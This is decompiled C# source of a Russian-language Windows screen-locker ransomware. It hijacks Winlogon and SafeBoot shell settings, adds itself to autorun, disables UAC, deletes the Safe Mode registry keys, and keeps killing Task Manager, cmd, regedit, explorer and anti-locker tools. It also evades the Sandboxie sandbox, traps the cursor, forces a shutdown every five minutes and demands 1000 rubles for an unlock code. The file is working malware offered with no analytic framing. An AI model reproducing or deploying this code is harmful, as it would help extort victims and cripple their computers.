using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace WindowsFormsApplication1;

public class Form1 : Form
{
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	internal struct TokPriv1Luid
	{
		public int Count;

		public long Luid;

		public int Attr;
	}

	internal const int SE_PRIVILEGE_ENABLED = 2;

	internal const int TOKEN_QUERY = 8;

	internal const int TOKEN_ADJUST_PRIVILEGES = 32;

	internal const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";

	public static string password = "19666";

	private WindowsPrincipal pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());

	private IntPtr ptr = default(IntPtr);

	private IContainer components;

	private Button button1;

	private Label label1;

	private TextBox textBox1;

	private Button button2;

	private Button button3;

	private Button button4;

	private Button button5;

	private Button button6;

	private Button button7;

	private Button button8;

	private Button button9;

	private Button button10;

	private Button button11;

	private Button button12;

	private Button button13;

	private Timer timer1;

	private Label label2;

	private Timer timer2;

	private Label label3;

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool Wow64DisableWow64FsRedirection(ref IntPtr ptr);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("advapi32.dll")]
	private static extern int InitiateSystemShutdownEx(string lpMachineName, string lpMessage, int dwTimeout, bool bForceAppsClosed, bool bRebootAfterShutdown);

	[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

	[DllImport("kernel32.dll", ExactSpelling = true)]
	internal static extern IntPtr GetCurrentProcess();

	[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);

	[DllImport("advapi32.dll", SetLastError = true)]
	internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

	[DllImport("user32.dll")]
	private static extern bool LockWorkStation();

	private void SetPriv()
	{
		IntPtr phtok = IntPtr.Zero;
		if (OpenProcessToken(GetCurrentProcess(), 40, ref phtok))
		{
			TokPriv1Luid newst = default(TokPriv1Luid);
			newst.Count = 1;
			newst.Attr = 2;
			newst.Luid = 0L;
			LookupPrivilegeValue(null, "SeShutdownPrivilege", ref newst.Luid);
			AdjustTokenPrivileges(phtok, disall: false, ref newst, 0, IntPtr.Zero, IntPtr.Zero);
		}
	}

	public int halt(bool RSh, bool Force)
	{
		SetPriv();
		return InitiateSystemShutdownEx(null, null, 0, Force, RSh);
	}

	public int Lock()
	{
		if (LockWorkStation())
		{
			return 1;
		}
		return 0;
	}

	public Form1()
	{
		InitializeComponent();
		Wow64DisableWow64FsRedirection(ref ptr);
	}

	private bool IsSandboxed()
	{
		return GetModuleHandle("SbieDll.dll") != IntPtr.Zero;
	}

	public static void ini()
	{
		string executablePath = Application.get_ExecutablePath();
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		Registry.LocalMachine.OpenSubKey("System\\CurrentControlSet\\Services\\CDROM", writable: true);
		Registry.LocalMachine.OpenSubKey("System\\CurrentControlSet\\Services\\USBSTOR", writable: true);
		RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot", writable: true);
		RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Control\\SafeBoot", writable: true);
		RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet002\\Control\\SafeBoot", writable: true);
		RegistryKey registryKey5 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true);
		RegistryKey registryKey6 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true);
		RegistryKey registryKey7 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
		RegistryKey registryKey8 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
		RegistryKey registryKey9 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
		RegistryKey registryKey10 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer", writable: true);
		try
		{
			registryKey2.SetValue("AlternateShell", executablePath);
			registryKey2.Close();
			registryKey3.SetValue("AlternateShell", executablePath);
			registryKey3.Close();
			registryKey4.SetValue("AlternateShell", executablePath);
			registryKey4.Close();
			registryKey.SetValue("Antivir", Application.get_ExecutablePath().ToString());
			registryKey.Close();
			registryKey5.SetValue("NoClose", "1");
			registryKey5.Close();
			registryKey6.SetValue("NoViewOnDrive", "12");
			registryKey6.Close();
			registryKey7.SetValue("Shell", executablePath);
			registryKey7.Close();
			registryKey8.SetValue("Shell", executablePath);
			registryKey8.SetValue("Userinit", executablePath);
			registryKey8.SetValue("UIHost", executablePath);
			registryKey8.Close();
			registryKey9.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
			registryKey9.Close();
			registryKey10.SetValue("RestrictRun", 1, RegistryValueKind.DWord);
			using (RegistryKey registryKey11 = registryKey10.CreateSubKey("RestrictRun"))
			{
				registryKey11.SetValue("1", "exp.exe");
			}
			registryKey10.Close();
			Registry.LocalMachine.DeleteSubKeyTree("System\\CurrentControlSet\\Control\\SafeBoot");
		}
		catch
		{
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		if (!pricipal.IsInRole(WindowsBuiltInRole.Administrator))
		{
			MessageBox.Show("запустите программу от имени администратора!", "Ошибка!");
			Application.Exit();
		}
		if (IsSandboxed())
		{
			Application.Exit();
		}
		Thread thread = new Thread(ini);
		thread.Start();
		Thread thread2 = new Thread(prockill);
		thread2.Start();
	}

	private void button2_Click(object sender, EventArgs e)
	{
		TextBox obj = textBox1;
		((Control)obj).set_Text(((Control)obj).get_Text() + "0");
	}

	private void button11_Click(object sender, EventArgs e)
	{
		TextBox obj = textBox1;
		((Control)obj).set_Text(((Control)obj).get_Text() + "9");
	}

	private void button10_Click(object sender, EventArgs e)
	{
		TextBox obj = textBox1;
		((Control)obj).set_Text(((Control)obj).get_Text() + "8");
	}

	private void button9_Click(object sender, EventArgs e)
	{
		TextBox obj = textBox1;
		((Control)obj).set_Text(((Control)obj).get_Text() + "7");
	}

	private void button8_Click(object sender, EventArgs e)
	{
		TextBox obj = textBox1;
		((Control)obj).set_Text(((Control)obj).get_Text() + "6");
	}

	private void button7_Click(object sender, EventArgs e)
	{
		TextBox obj = textBox1;
		((Control)obj).set_Text(((Control)obj).get_Text() + "5");
	}

	private void button6_Click(object sender, EventArgs e)
	{
		TextBox obj = textBox1;
		((Control)obj).set_Text(((Control)obj).get_Text() + "4");
	}

	private void button5_Click(object sender, EventArgs e)
	{
		TextBox obj = textBox1;
		((Control)obj).set_Text(((Control)obj).get_Text() + "3");
	}

	private void button4_Click(object sender, EventArgs e)
	{
		TextBox obj = textBox1;
		((Control)obj).set_Text(((Control)obj).get_Text() + "2");
	}

	private void button3_Click(object sender, EventArgs e)
	{
		TextBox obj = textBox1;
		((Control)obj).set_Text(((Control)obj).get_Text() + "1");
	}

	private void button12_Click(object sender, EventArgs e)
	{
		if (((Control)textBox1).get_Text() != string.Empty)
		{
			((Control)textBox1).set_Text(((Control)textBox1).get_Text().Substring(0, ((Control)textBox1).get_Text().Length - 1));
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_CloseReason() == 3)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		Cursor.set_Clip(((Control)this).get_Bounds());
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)0);
	}

	private void button13_Click(object sender, EventArgs e)
	{
		((Control)textBox1).set_Text(string.Empty);
	}

	public static void prockill()
	{
		while (true)
		{
			try
			{
				string[] array = new string[10] { "taskmgr", "notepad", "cmd", "regedit", "explorer", "AnVir", "ProcessHacker", "iexplore", "AntiWinLockerTray", "ServiceAntiWinLocker" };
				string[] array2 = array;
				foreach (string processName in array2)
				{
					try
					{
						Process[] processesByName = Process.GetProcessesByName(processName);
						Process[] array3 = processesByName;
						foreach (Process process in array3)
						{
							process.Kill();
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			Thread.Sleep(500);
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		if (((Control)textBox1).get_Text() == password)
		{
			Application.Exit();
		}
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		halt(RSh: false, Force: true);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_01b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bb: Expected O, but got Unknown
		//IL_0d6c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d76: Expected O, but got Unknown
		components = new Container();
		button1 = new Button();
		label1 = new Label();
		textBox1 = new TextBox();
		button2 = new Button();
		button3 = new Button();
		button4 = new Button();
		button5 = new Button();
		button6 = new Button();
		button7 = new Button();
		button8 = new Button();
		button9 = new Button();
		button10 = new Button();
		button11 = new Button();
		button12 = new Button();
		button13 = new Button();
		timer1 = new Timer(components);
		label2 = new Label();
		timer2 = new Timer(components);
		label3 = new Label();
		((Control)this).SuspendLayout();
		((Control)button1).set_BackColor(Color.Transparent);
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_ForeColor(Color.White);
		((Control)button1).set_Location(new Point(378, 247));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(163, 25));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("Разблокировать");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)label1).set_ForeColor(Color.Red);
		((Control)label1).set_Location(new Point(68, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(473, 45));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Windows заблокирован!");
		label1.set_TextAlign((ContentAlignment)32);
		((Control)textBox1).set_ForeColor(Color.Red);
		((Control)textBox1).set_Location(new Point(61, 154));
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		((Control)textBox1).set_Size(new Size(488, 20));
		((Control)textBox1).set_TabIndex(2);
		((Control)button2).set_BackColor(Color.Transparent);
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_ForeColor(Color.White);
		((Control)button2).set_Location(new Point(427, 180));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(34, 23));
		((Control)button2).set_TabIndex(3);
		((Control)button2).set_Text("0");
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)button3).set_BackColor(Color.Transparent);
		((ButtonBase)button3).set_FlatStyle((FlatStyle)0);
		((Control)button3).set_ForeColor(Color.White);
		((Control)button3).set_Location(new Point(68, 180));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(34, 23));
		((Control)button3).set_TabIndex(4);
		((Control)button3).set_Text("1");
		((ButtonBase)button3).set_UseVisualStyleBackColor(false);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((Control)button4).set_BackColor(Color.Transparent);
		((ButtonBase)button4).set_FlatStyle((FlatStyle)0);
		((Control)button4).set_ForeColor(Color.White);
		((Control)button4).set_Location(new Point(108, 180));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(34, 23));
		((Control)button4).set_TabIndex(5);
		((Control)button4).set_Text("2");
		((ButtonBase)button4).set_UseVisualStyleBackColor(false);
		((Control)button4).add_Click((EventHandler)button4_Click);
		((Control)button5).set_BackColor(Color.Transparent);
		((ButtonBase)button5).set_FlatStyle((FlatStyle)0);
		((Control)button5).set_ForeColor(Color.White);
		((Control)button5).set_Location(new Point(148, 180));
		((Control)button5).set_Name("button5");
		((Control)button5).set_Size(new Size(34, 23));
		((Control)button5).set_TabIndex(6);
		((Control)button5).set_Text("3");
		((ButtonBase)button5).set_UseVisualStyleBackColor(false);
		((Control)button5).add_Click((EventHandler)button5_Click);
		((Control)button6).set_BackColor(Color.Transparent);
		((ButtonBase)button6).set_FlatStyle((FlatStyle)0);
		((Control)button6).set_ForeColor(Color.White);
		((Control)button6).set_Location(new Point(188, 180));
		((Control)button6).set_Name("button6");
		((Control)button6).set_Size(new Size(34, 23));
		((Control)button6).set_TabIndex(7);
		((Control)button6).set_Text("4");
		((ButtonBase)button6).set_UseVisualStyleBackColor(false);
		((Control)button6).add_Click((EventHandler)button6_Click);
		((Control)button7).set_BackColor(Color.Transparent);
		((ButtonBase)button7).set_FlatStyle((FlatStyle)0);
		((Control)button7).set_ForeColor(Color.White);
		((Control)button7).set_Location(new Point(228, 180));
		((Control)button7).set_Name("button7");
		((Control)button7).set_Size(new Size(34, 23));
		((Control)button7).set_TabIndex(8);
		((Control)button7).set_Text("5");
		((ButtonBase)button7).set_UseVisualStyleBackColor(false);
		((Control)button7).add_Click((EventHandler)button7_Click);
		((Control)button8).set_BackColor(Color.Transparent);
		((ButtonBase)button8).set_FlatStyle((FlatStyle)0);
		((Control)button8).set_ForeColor(Color.White);
		((Control)button8).set_Location(new Point(268, 180));
		((Control)button8).set_Name("button8");
		((Control)button8).set_Size(new Size(34, 23));
		((Control)button8).set_TabIndex(9);
		((Control)button8).set_Text("6");
		((ButtonBase)button8).set_UseVisualStyleBackColor(false);
		((Control)button8).add_Click((EventHandler)button8_Click);
		((Control)button9).set_BackColor(Color.Transparent);
		((ButtonBase)button9).set_FlatStyle((FlatStyle)0);
		((Control)button9).set_ForeColor(Color.White);
		((Control)button9).set_Location(new Point(308, 180));
		((Control)button9).set_Name("button9");
		((Control)button9).set_Size(new Size(34, 23));
		((Control)button9).set_TabIndex(10);
		((Control)button9).set_Text("7");
		((ButtonBase)button9).set_UseVisualStyleBackColor(false);
		((Control)button9).add_Click((EventHandler)button9_Click);
		((Control)button10).set_BackColor(Color.Transparent);
		((ButtonBase)button10).set_FlatStyle((FlatStyle)0);
		((Control)button10).set_ForeColor(Color.White);
		((Control)button10).set_Location(new Point(348, 180));
		((Control)button10).set_Name("button10");
		((Control)button10).set_Size(new Size(34, 23));
		((Control)button10).set_TabIndex(11);
		((Control)button10).set_Text("8");
		((ButtonBase)button10).set_UseVisualStyleBackColor(false);
		((Control)button10).add_Click((EventHandler)button10_Click);
		((Control)button11).set_BackColor(Color.Transparent);
		((ButtonBase)button11).set_FlatStyle((FlatStyle)0);
		((Control)button11).set_ForeColor(Color.White);
		((Control)button11).set_Location(new Point(387, 180));
		((Control)button11).set_Name("button11");
		((Control)button11).set_Size(new Size(34, 23));
		((Control)button11).set_TabIndex(12);
		((Control)button11).set_Text("9");
		((ButtonBase)button11).set_UseVisualStyleBackColor(false);
		((Control)button11).add_Click((EventHandler)button11_Click);
		((Control)button12).set_BackColor(Color.Transparent);
		((ButtonBase)button12).set_FlatStyle((FlatStyle)0);
		((Control)button12).set_ForeColor(Color.White);
		((Control)button12).set_Location(new Point(467, 180));
		((Control)button12).set_Name("button12");
		((Control)button12).set_Size(new Size(34, 23));
		((Control)button12).set_TabIndex(13);
		((Control)button12).set_Text("<<");
		((ButtonBase)button12).set_UseVisualStyleBackColor(false);
		((Control)button12).add_Click((EventHandler)button12_Click);
		((Control)button13).set_BackColor(Color.Transparent);
		((ButtonBase)button13).set_FlatStyle((FlatStyle)0);
		((Control)button13).set_ForeColor(Color.White);
		((Control)button13).set_Location(new Point(507, 180));
		((Control)button13).set_Name("button13");
		((Control)button13).set_Size(new Size(34, 23));
		((Control)button13).set_TabIndex(14);
		((Control)button13).set_Text("C");
		((ButtonBase)button13).set_UseVisualStyleBackColor(false);
		((Control)button13).add_Click((EventHandler)button13_Click);
		timer1.set_Enabled(true);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_ForeColor(SystemColors.ActiveCaption);
		((Control)label2).set_Location(new Point(58, 74));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(482, 26));
		((Control)label2).set_TabIndex(15);
		((Control)label2).set_Text("Ваш Windows был заблокирован за использование не легального програмного обеспечения\r\nДля получения кода разблокировки пополните счет 89169525233 на сумму  1000 рублей!");
		timer2.set_Enabled(true);
		timer2.set_Interval(300000);
		timer2.add_Tick((EventHandler)timer2_Tick);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_BackColor(Color.Transparent);
		((Control)label3).set_ForeColor(Color.Red);
		((Control)label3).set_Location(new Point(134, 298));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(399, 13));
		((Control)label3).set_TabIndex(16);
		((Control)label3).set_Text("ВНИМАНИЕ! Компьютер выключится через 5 минут если вы не введете код!");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(608, 347));
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)button13);
		((Control)this).get_Controls().Add((Control)(object)button12);
		((Control)this).get_Controls().Add((Control)(object)button11);
		((Control)this).get_Controls().Add((Control)(object)button10);
		((Control)this).get_Controls().Add((Control)(object)button9);
		((Control)this).get_Controls().Add((Control)(object)button8);
		((Control)this).get_Controls().Add((Control)(object)button7);
		((Control)this).get_Controls().Add((Control)(object)button6);
		((Control)this).get_Controls().Add((Control)(object)button5);
		((Control)this).get_Controls().Add((Control)(object)button4);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form1");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
